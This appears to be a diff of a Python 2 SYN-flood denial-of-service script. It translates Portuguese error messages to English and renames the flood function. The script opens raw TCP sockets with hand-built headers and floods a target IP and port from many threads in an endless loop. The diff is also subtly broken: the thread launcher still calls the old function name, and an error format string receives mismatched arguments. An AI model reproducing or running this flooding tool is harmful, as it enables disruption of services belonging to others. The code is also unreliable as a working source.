@@ -6,8 +6,8 @@ import struct
 from struct import *
 
 if len(sys.argv) < 4:
-    print "Erro. Execute com python %s <porta> <ip> <No de threads>" % \
-          (sys.argv[0])
+    print "Error. Unexpected initialization."
+    print "Expected: python %s <port> <ip> <thread number>" % (sys.argv[0])
 
 def calcChecksum(header):
     unpacked = struct.unpack('!'+'H'*(len(header)/2), header)
@@ -20,13 +20,13 @@ def calcChecksum(header):
     
     return checksum
 
-def syn_flood(ID, portDest, ipDest):
+def synFlood(ID, portDest, ipDest):
     while 1:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW,\
                               socket.IPPROTO_TCP)
         except:
-            print "Erro: Nao foi possivel criar socket na thread %s" % (ID)
+            print "Error: socket creation failed in thread %s." % (ID)
             sys.exit()
 
         s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -75,7 +75,7 @@ for i in range(int(sys.argv[3])):
     try:
         thread.start_new_thread(syn_flood, (i, sys.argv[1], sys.argv[2],))
     except:
-        print "Erro: Nao foi possivel iniciar a thread %s" % (str(e), i)
+        print "Error: start_new_thread failed. %s" % (str(e), i)
         sys.exit()
 
 while 1:
